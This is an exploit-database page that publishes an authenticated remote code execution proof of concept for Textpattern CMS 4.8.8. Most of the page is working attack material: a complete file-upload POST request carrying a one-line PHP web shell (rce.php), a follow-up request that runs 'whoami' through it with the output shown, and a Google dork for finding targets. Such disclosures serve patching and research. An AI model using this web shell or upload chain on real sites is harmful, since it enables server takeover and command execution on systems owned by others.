---
title: Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)
url: https://cxsecurity.com/issue/WLB-2022120036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-21
fetch_date: 2025-10-04T02:03:10.228175
---

# Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)** **2022.12.20**  **![tr](https://cert.cx/cxstatic/images/flags/tr.png) [Alperen Ergel](https://cxsecurity.com/author/Alperen%2BErgel/1/) **(TR)** ![tr](https://cert.cx/cxstatic/images/flags/tr.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** intext:"Published with Textpattern CMS"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Alperen Ergel
# Contact: @alpernae (IG/TW)
# Software Homepage: https://textpattern.com/
# Version : 4.8.8
# Tested on: windows 11 xammp | Kali linux
# Category: WebApp
# Google Dork: intext:"Published with Textpattern CMS"
# Date: 10/09/2022
#
######## Description ########
#
# Step 1: Login admin account and go settings of site
# Step 2: Upload a file to web site and selecet the rce.php
# Step3 : Upload your webshell that's it...
#
######## Proof of Concept ########
========>>> START REQUEST <<<=========
############# POST REQUEST (FILE UPLOAD) ############################## (1)
POST /textpattern/index.php?event=file HTTP/1.1
Host: localhost
Content-Length: 1038
sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, \*/\*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMgUEFltFdqBVvdJu
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/textpattern/index.php?event=file
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: txp\_login=admin%2C94d754006b895d61d9ce16cf55165bbf; txp\_login\_public=4353608be0admin
Connection: close
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="fileInputOrder"
1/1
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="app\_mode"
async
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="MAX\_FILE\_SIZE"
2000000
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="event"
file
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="step"
file\_insert
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="id"
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="\_txp\_token"
16ea3b64ca6379aee9599586dae73a5d
------WebKitFormBoundaryMgUEFltFdqBVvdJu
Content-Disposition: form-data; name="thefile[]"; filename="rce.php"
Content-Type: application/octet-stream
<?php if(isset($\_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($\_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
------WebKitFormBoundaryMgUEFltFdqBVvdJu--
############ POST RESPONSE (FILE UPLOAD) ######### (1)
HTTP/1.1 200 OK
Date: Sat, 10 Sep 2022 15:28:57 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
X-Powered-By: PHP/8.1.6
X-Textpattern-Runtime: 35.38 ms
X-Textpattern-Querytime: 9.55 ms
X-Textpattern-Queries: 16
X-Textpattern-Memory: 2893 kB
Content-Length: 270
Connection: close
Content-Type: text/javascript; charset=utf-8
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
############ REQUEST TO THE PAYLOAD ############################### (2)
GET /files/c.php?cmd=whoami HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: txp\_login\_public=4353608be0admin
Connection: close
############ RESPONSE THE PAYLOAD ############################### (2)
HTTP/1.1 200 OK
Date: Sat, 10 Sep 2022 15:33:06 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
X-Powered-By: PHP/8.1.6
Content-Length: 29
Connection: close
Content-Type: text/html; charset=UTF-8
<pre>alpernae\alperen
</pre>
========>>> END REQUEST <<<=========

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top